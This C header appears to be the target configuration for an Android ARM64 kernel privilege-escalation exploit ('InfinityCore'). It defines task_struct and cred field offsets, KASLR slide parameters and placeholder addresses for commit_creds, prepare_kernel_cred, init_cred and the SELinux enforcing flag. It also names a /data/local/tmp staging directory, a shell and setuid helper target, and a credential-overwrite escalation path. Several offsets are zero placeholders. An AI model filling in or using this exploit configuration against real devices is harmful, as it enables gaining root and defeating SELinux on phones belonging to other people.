#ifndef INFINITYCORE_ANDROID_TARGET_H
#define INFINITYCORE_ANDROID_TARGET_H

#define IC_ARCH_ARM64 1

#define OFF_TASK_STRUCT_CRED             0x838
#define OFF_TASK_STRUCT_REAL_CRED        0x830
#define OFF_TASK_STRUCT_CPU_TIMER_HEAD   0x7c8
#define OFF_TASK_STRUCT_PID              0x630
#define OFF_TASK_STRUCT_TGID             0x634
#define OFF_TASK_STRUCT_SIGNAL           0x890
#define OFF_TASK_STRUCT_MM               0x5a0
#define OFF_TASK_STRUCT_FILES            0x878
#define OFF_TASK_STRUCT_COMM             0x848

#define OFF_CRED_UID                     4
#define OFF_CRED_GID                     8
#define OFF_CRED_EUID                    20
#define OFF_CRED_EGID                    24
#define OFF_CRED_SUID                    12
#define OFF_CRED_SGID                    16
#define OFF_CRED_FSUID                   28
#define OFF_CRED_FSGID                   32
#define OFF_CRED_CAP_INHERITABLE          40
#define OFF_CRED_CAP_PERMITTED            48
#define OFF_CRED_CAP_EFFECTIVE            56
#define OFF_CRED_SECURITY                120
#define OFF_CRED_USER_NS                 136

#define SIZEOF_CRED                      0xb0

#define OFF_K_ITIMER_IT_CPU              0x78
#define OFF_K_ITIMER_IT_CPU_ELIST        0xa8
#define OFF_K_ITIMER_IT_CPU_HANDLING     0xc0
#define SIZEOF_K_ITIMER                  0x108

#define OFF_SIGQUEUE_LIST                0x0000
#define OFF_SIGQUEUE_SIG                 0x0000
#define SIZEOF_SIGQUEUE                  0x0000

#define OFF_PIPE_BUFFER_FLAGS            0x0000
#define OFF_PIPE_BUFFER_PAGE             0x0000
#define SIZEOF_PIPE_BUFFER               0x0000

#define OFF_PAGE_FLAGS                   0x0000
#define OFF_PAGE_MAPPING                 0x0000
#define SIZEOF_PAGE                      0x0000

#define OFF_FUTEX_PRIVATE_HASH_REF       0x0000
#define SIZEOF_FUTEX_HASH_BUCKET         0x0000
#define SIZEOF_FUTEX_PRIVATE_HASH        0x0000
#define FUTEX_HASH_INITIAL_MASK          0x7

#define OFF_MM_STRUCT_FUTEX              0x0000
#define OFF_MM_STRUCT_MMAP_LOCK          0x0000

#define KERNEL_LOGICAL_BASE              0xffffff8000000000UL
#define KERNEL_PHYS_OFFSET               0x0UL
#define KERNEL_POINTER_TAG_MASK          0xffff000000000000UL

#define KASLR_ALIGN                      0x200000UL
#define KASLR_SLIDE_MAX                  0x40000000UL

#define CALLBACK_MAGIC_TASK              0x4100000000UL
#define CALLBACK_MAGIC_CRED              0x4200000000UL
#define CALLBACK_MAGIC_TIMER             0x4300000000UL
#define CALLBACK_MAGIC_SIGQUEUE          0x4400000000UL
#define CALLBACK_MAGIC_PIPE              0x4500000000UL

#define CRED_INIT_NAMESPACE              0x0UL
#define SELINUX_ENFORCING_SYMBOL         0x0UL
#define INIT_TASK_SYMBOL                 0x0UL
#define INIT_CRED_SYMBOL                 0x0UL
#define COMMIT_CREDS_SYMBOL              0x0UL
#define PREPARE_KERNEL_CRED_SYMBOL       0x0UL

#define KERNEL_5_10_SERIES_ARM64         1

#define IC_FUTEX_WAIT_PRIVATE            128
#define IC_FUTEX_WAKE_PRIVATE            129
#define IC_FUTEX_LOCK_PI_PRIVATE         130

#define IC_TIMER_ABSTIME_FLAG            1

#define IC_MMAP_ADDRESS_HINT             0x1000000000UL

#define IC_GRANULE_SIZE                  0x1000UL
#define IC_PUD_SIZE                      0x40000000UL
#define IC_PMD_SIZE                      0x200000UL
#define IC_PTE_SIZE                      0x1000UL

#define IC_PAGE_SHIFT                    12
#define IC_VA_BITS                       39

#define IC_SHEAF_REFILL_BATCH            12
#define IC_SLUB_STRICT_NUMA_REQUIRED     1

#define IC_USER_CAP_SYS_ADMIN            21

#define IC_SECCOMP_DISABLED              0

#define IC_STAGING_DIR_DEFAULT           "/data/local/tmp"
#define IC_APP_DATA_DIR                  "/data/data"

#define IC_SHELL_BINARY                  "/system/bin/sh"
#define IC_SETUID_HELPER_TARGET          "/system/bin/sh"

#define IC_TRIGGER_MINCORE_PAGES         0x1000UL
#define IC_TRIGGER_MINCORE_OVERFLOW      40UL

#define IC_ANDROID_LPE_VIA_CRED          1
#define IC_ANDROID_LPE_VIA_SELINUX       0
#define IC_ANDROID_LPE_VIA_DEBUGFS       0

#endif
